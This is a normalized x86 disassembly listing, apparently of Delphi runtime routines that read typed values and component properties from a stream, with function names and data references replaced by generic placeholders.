mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
call sub_4303e0
jmp r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_435f60
pop ecx
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
call sub_4303e0
sub_436507
push ebp
call sub_43607c
pop ecx
test al al
je r-xdata
call sub_406120
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x8 ]
call sub_4055f0
sub_436590
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436600
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_4365eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436600
mov eax [ ebp - 0x4 ]
call sub_435a48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_435be8
retn
sub_436600
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4358ac
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436ba8
mov eax [ ebp - 0x4 ]
call sub_436a74
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_40587c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_4366c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_40587c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4358ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_436350
mov eax [ ebp - 0x4 ]
call sub_436a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4366c9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_4366d0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_437b4c
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_436708
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_435cf4
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_436708
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_437b4c
cmp al 0x15
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_436a28
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_435cf4
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_43674c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_437b4c
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_436a28
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_435cf4
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_436790
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_437b4c
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_436a28
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_435cf4
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_4367e0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_437b4c
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_436a28
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_435cf4
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_436824
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_436950
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_437b4c
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_435670
movzx eax [ eax + lookup_table_436863 ]
jmp [ eax * 4 + jump_table_436871 ]
lea edx [ ebp - 0x9 ]
mov ecx 0x1
mov eax ebx
call sub_435cf4
push 0x0
movzx ecx [ ebp - 0x9 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_40699c
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_4070a8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4070a8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4070a8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_4070a8
jmp r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_406c24
mov edx eax
movzx ecx [ ebp - 0x9 ]
mov eax ebx
call sub_435cf4
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40a084
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4070a8
jmp r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436957
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_406a80
mov edi eax
sub_4369bc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_437b4c
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_435cf4
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_435cf4
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_435cf4
jmp r-xdata
jmp r-xdata
call sub_435670
sub_436a28
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_435cd0
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_4369bc
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_437b4c
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_435cf4
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_436a7c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx eax [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_435cd0
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_437b4c
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_4369bc
mov [ edi ] eax
sub_436ab9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_436b80
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4070fc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4070fc
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0x11
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0x11
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x11
mov eax [ ebx + 0x4 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x11
lea eax [ ebp - 0x24 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436b87
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4054c8
sub_436ba8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_436e10
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_405e48#3
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_437894
xor edx edx
push ebp
push j_sub_405e48#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
push eax
mov ecx ebx
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4077d0
cmp esi ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
call sub_406a60
cmp [ eax + ebx * 2 - 0x2 ] 0x2e
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
add eax 0xffffffb8
mov eax [ eax ]
call sub_4232e4
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
add eax 0xffffffb8
mov eax [ eax ]
call sub_4232e4
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_436fc4
jmp r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
add eax 0x80
mov edx [ ebp - 0x8 ]
call sub_4070a8
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x88 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_435ce0
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_4233bc
mov [ ebp - 0x18 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_435ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_436b8c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e17
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
mov [ ebp - 0x10 ] ebx
jmp r-xdata
sub_436dc7
add [ eax ] eax
add [ eax ] al
dec esp
fadd [ eax ]
shr [ ebp + 0x43 ] cl
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x88 ] 0x0
je r-xdata
call sub_406120
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436e17
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
sub_436e20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_42fd58
mov ebx eax
test ebx ebx
je r-xdata
call sub_435670
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_423430
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_436e68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_435078
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4303e0
pop edi
pop esi
pop ebx
pop ebp
retn
sub_436ea8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_436ef7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43864c
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_42427c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436efe
lea eax [ ebp - 0x10 ]
call sub_41c29c
retn
sub_436f04
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_436fb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_435cd0
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_436824
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_435078
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4303e0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_437b4c
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_424418
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436fbd
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_436fc4
push ebp
mov ebp esp
push ecx
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_437319
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
movzx eax [ ebx ]
cmp eax 0x12
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437320
lea eax [ ebp - 0x38 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x30 ]
call sub_406d54
lea eax [ ebp - 0x2c ]
call j_sub_4068a0
lea eax [ ebp - 0x28 ]
call sub_406d54
lea eax [ ebp - 0x20 ]
mov edx 0x3
call j_sub_4068c4
retn
jmp [ eax * 4 + jump_table_437054 ]
mov eax [ rw-data ]
call sub_435658
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4233bc
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_435cd0
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_435d90
movzx ecx ax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423430
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_435e24
movzx ecx ax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423430
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_436824
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_423188
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423430
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4366d0
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_424030
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_437924
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
xchg ecx eax
call sub_423df4
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_437a0c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423a8c
jmp r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_437a0c
mov edx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
call sub_4072f8
mov ecx [ ebp - 0x2c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423df4
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4377b4
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423430
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_435cd0
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_435cd0
cmp al 0xd
jne r-xdata
push ebp
call sub_436ea8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_436a28
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_42435c
jmp r-xdata
push ebp
call sub_436f04
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4233bc
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4369bc
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423430
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_436824
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_436e20
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_437b4c
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_423430
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_436824
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_437b4c
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4242fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_437b4c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4233bc
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_435e84
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4242fc
jmp r-xdata
push ebp
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_436824
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_436e68
pop ecx
jmp r-xdata
sub_437328
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_4070a8
jmp r-xdata
mov eax [ ebx ]
call sub_42fef4
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0x11
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_4129f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_437390
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4376b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_437870
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_43768e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_43764f
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_437894
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_437894
mov eax [ ebp - 0x1c ]
call sub_42f8d8
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_437894
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_437894
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_437328
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_437894
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx eax
push 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42f560
mov edx [ ebp - 0x4 ]
mov [ edx + 0x84 ] eax
xor eax eax
push ebp
push sub_4375f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_40a7e8
mov eax [ eax + 0xc ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4303e0
xor eax eax
push ebp
push sub_4375d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_430608
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4375d8
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4055f0
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4305a0
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_437625
call sub_404288
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_406174
jmp r-xdata
call sub_406120
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_43533c
